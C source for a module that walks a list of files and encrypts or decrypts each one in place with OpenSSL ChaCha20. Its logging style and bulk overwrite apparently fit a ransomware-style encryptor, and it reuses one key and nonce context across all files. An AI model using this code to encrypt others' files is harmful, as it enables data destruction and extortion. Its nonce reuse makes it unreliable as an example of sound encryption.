#include "crypto_chacha20.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

static unsigned char* get_file_content(char* p_filePath, size_t* p_inLen)
{
    /* Open file */
    FILE* p_file = fopen(p_filePath, "rb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Compute the size of the file */
    fseek(p_file, 0, SEEK_END);
    size_t inLen = ftell(p_file);
    *p_inLen = inLen;
    fseek(p_file, 0, SEEK_SET);

    /* Allocate memory for buffers */
    unsigned char* inBuf = malloc(sizeof(unsigned char) * inLen);
    if (inBuf == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }

    /* Read file content */
    if (fread(inBuf, 1, inLen, p_file) != inLen)
    {
        perror("[-] fread failed");
        fclose(p_file);
        exit(1);
    }

    /* Close file */
    fclose(p_file);

    return inBuf;
}

// Fonction pour convertir une chaîne hexadécimale en octets
unsigned char* hex_to_bytes(const char* hex, size_t* out_len) {
    *out_len = strlen(hex) / 2;
    unsigned char* bytes = malloc(*out_len);
    if (bytes == NULL) {
        perror("[-] malloc failed");
        exit(1);
    }
    for (size_t i = 0; i < *out_len; i++) {
        sscanf(hex + 2*i, "%2hhx", &bytes[i]);
    }
    return bytes;
}

void print_hex(const char* label, const unsigned char* data, size_t len) {
    printf("%s: ", label);
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

void encrypt_file(fileData* p_fileData, EVP_CIPHER_CTX* p_key) {
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }
    sprintf(p_filePath, "%s/%s", p_fileData->p_path, p_fileData->p_name);

    /* Buffers environment */
    size_t inLen = 0;
    unsigned char* inBuf = get_file_content(p_filePath, &inLen);
    int cipherInLen = inLen;
    int finalLen = 0;
    int outLen = 0;

    unsigned char* outBuf = malloc(sizeof(unsigned char) * inLen);

    /* Encryption environment initialisation */
    if(!EVP_EncryptInit_ex(p_key,EVP_chacha20(), NULL, NULL, NULL))
    {
        perror("[-] EVP_EncryptInit_ex failed");
        exit(1);
    }

    printf("[+] Encrypting file: %s\n", p_filePath);
    printf("[+] File size: %ld\n", inLen);

    /* Encrypt data blocks */
    if(!EVP_EncryptUpdate(p_key, outBuf, &cipherInLen, inBuf, inLen))
    {
        perror("[-] EVP_EncryptUpdate failed");
        exit(1);
    }

    printf("[+] Encrypted data: %s\n", outBuf);
    printf("[+] Encrypted data size: %d\n", cipherInLen);

    /* update ciphertext with the final remaining bytes */
    if(!EVP_EncryptFinal_ex(p_key, outBuf+cipherInLen, &finalLen))
    {
        perror("[-] EVP_EncryptFinal_ex failed");
        exit(1);
    }

    outLen = cipherInLen + finalLen;

    printf("[+] Encrypted data: %s\n", outBuf);
    printf("[+] Encrypted data size: %d\n", outLen);
 
    /* Open the file in write mode */
    FILE* p_file = fopen(p_filePath, "wb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Write the encrypted data to the file */
    if (fwrite(outBuf, 1, outLen, p_file) != outLen)
    {
        perror("[-] fwrite failed");
        fclose(p_file);
        exit(1);
    }

    /* Close the file */
    fclose(p_file);

    /* free memory */
    free(p_filePath);
    free(inBuf);
    free(outBuf);
}

void decrypt_file(fileData* p_fileData, EVP_CIPHER_CTX* p_key) {
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }
    sprintf(p_filePath, "%s/%s", p_fileData->p_path, p_fileData->p_name);

    /* Buffers environment */
    size_t inLen = 0;
    unsigned char* inBuf = get_file_content(p_filePath, &inLen);
    int plainLen = inLen;
    int finalLen = 0;
    int outLen = 0;

    unsigned char* outBuf = malloc(sizeof(unsigned char) * inLen);

    /* Encryption environment initialisation */
    if(!EVP_DecryptInit_ex(p_key, EVP_chacha20(), NULL, NULL, NULL))
    {
        perror("[-] EVP_DecryptInit_ex failed");
        exit(1);
    }

    printf("[+] Decrypting file: %s\n", p_filePath);
    printf("[+] File size: %ld\n", inLen);

    /* Encrypt data blocks */
    if(!EVP_DecryptUpdate(p_key, outBuf, &plainLen, inBuf, inLen))
    {
        perror("[-] EVP_DecryptUpdate failed");
        exit(1);
    }

    printf("[+] Decrypted data: %s\n", outBuf);
    printf("[+] Decrypted data size: %d\n", plainLen);

    /* update ciphertext with the final remaining bytes */
    if(!EVP_DecryptFinal_ex(p_key, outBuf+plainLen, &finalLen))
    {
        perror("[-] EVP_DecryptFinal_ex failed");
        exit(1);
    }

    outLen = plainLen + finalLen;

    printf("[+] Decrypted data: %s\n", outBuf);
    printf("[+] Decrypted data size: %d\n", outLen);
 
    /* Open the file in write mode */
    FILE* p_file = fopen(p_filePath, "wb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Write the encrypted data to the file */
    if (fwrite(outBuf, 1, outLen, p_file) != outLen)
    {
        perror("[-] fwrite failed");
        fclose(p_file);
        exit(1);
    }

    /* Close the file */
    fclose(p_file);

    /* free memory */
    free(p_filePath);
    free(inBuf);
    free(outBuf);
}

void chacha20_encrypt_files(listFileData* p_listFileData, EVP_CIPHER_CTX* p_key) {
    // Parcourez tous les fichiers pour les chiffrer
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL) {
        encrypt_file(p_currentFile, p_key);
        p_currentFile = p_currentFile->p_next;
    }
}

void chacha20_decrypt_files(listFileData* p_listFileData, EVP_CIPHER_CTX* p_key) {
    // Parcourez tous les fichiers pour les déchiffrer
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL) {
        decrypt_file(p_currentFile, p_key);
        p_currentFile = p_currentFile->p_next;
    }
}

EVP_CIPHER_CTX* load_encryption_key(unsigned char* p_key, unsigned char* p_nonce) {
    EVP_CIPHER_CTX* e_ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_init(e_ctx);
    EVP_EncryptInit_ex(e_ctx, EVP_chacha20(), NULL, p_key, p_nonce);

    printf("[+] Encryption key loaded\n");

    return e_ctx;
}

EVP_CIPHER_CTX* load_decryption_key(unsigned char* p_key, unsigned char* p_nonce) {
    EVP_CIPHER_CTX* d_ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_init(d_ctx);
    EVP_DecryptInit_ex(d_ctx, EVP_chacha20(), NULL, p_key, p_nonce);

    printf("[+] Decryption key loaded\n");

    return d_ctx;
}
